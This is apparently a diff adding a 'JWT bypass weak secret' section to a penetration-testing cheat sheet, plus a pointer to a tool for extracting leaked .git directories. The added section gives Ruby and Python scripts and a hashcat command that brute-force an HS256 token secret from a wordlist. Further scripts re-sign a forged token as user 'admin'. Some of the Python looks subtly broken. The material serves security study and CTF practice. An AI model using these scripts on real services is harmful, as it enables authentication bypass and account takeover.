@@ -199,14 +199,120 @@ This only works if the server didn't verify the signature. We can tamper the JWT
 
 - Profit
 
+## JWT bypass weak secret
+Step-by-step:
+1. Bruteforce the secret:
+
+    - Using ruby:
+
+      ```ruby
+      require 'base64'
+      require 'openssl'
+
+      jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
+
+      header, data, signature = jwt.split('.')
+
+      def sign(data, secret)
+          Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new('SHA256'), secret, data)).gsub("=","")
+      end
+      File.readlines("/usr/share/wordlists/rockyou.txt").each do |line|
+          line.chomp!
+          if sign(header+"."+data, line) == signature
+              puts line
+              exit
+          end
+      end
+      ```
+
+    - Using python:
+
+      ```python
+      import hmac
+      import hashlib
+      import base64
+
+      jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
+
+      h, p, s = jwt.split(".")
+
+      def sign(str, key):
+          return base64.urlsafe_b64encode(hmac.new(key, str, hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
+
+      file = open("/usr/share/wordlists/rockyou.txt", 'r')
+      lines = file.readlines()
+
+      for line in lines:
+          key = line.strip()
+          if sign(h + "." + p, key) == s:
+              print(key)
+      ```
+
+    - Using hashcat:
+
+      ```bash
+      $ hashcat -m 16500 -d 3 jwt /usr/share/wordlists/rockyou.txt
+      ```
 
 
+2. Sign the JWT
 
+    - Using ruby:
 
+      ```ruby
+      require 'base64'
+      require 'openssl'
 
+      jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
+      secret = "pentesterlab"
+      header, data, signature = jwt.split('.')
 
+      def sign(data, secret)
+          Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new('SHA256'), secret, data)).gsub("=","")
+      end
 
+      require 'json';
+      payload = JSON.parse(Base64.urlsafe_decode64(data+"=="))
+      payload["user"] = "admin"
 
+      newdata = Base64.urlsafe_encode64(payload.to_json).gsub("=", "")
+      puts header+"."+newdata+"."+sign(header+"."+newdata, secret)
+      ```
+
+    - Using python:
+
+      ```python
+      import hmac
+      import hashlib
+      import base64
+
+      jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
+
+      h, p, s = jwt.split(".")
+
+      def sign(str, key):
+          return base64.urlsafe_b64encode(hmac.new(key, str, hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
+
+      key = "something"
+      payload = "eyJ1c2VyIjoiYWRtaW4ifQo"
+      print(h + "." + payload + "." + sign(h + "." + payload, key))
+      ```
+    
+    - Using ruby interactive (with hashcat):
+  
+      ```bash
+      $ gem install jwt 
+      $ irb
+
+      require 'jwt'
+
+      payload = {"user":"admin"}
+
+      JWT.encode payload, "SECRET", "HS256"
+      ```
+
+## Leaked .git
+We can [this](https://github.com/internetwache/GitTools) tools to extract leaked `.git/` directory
 
 
 
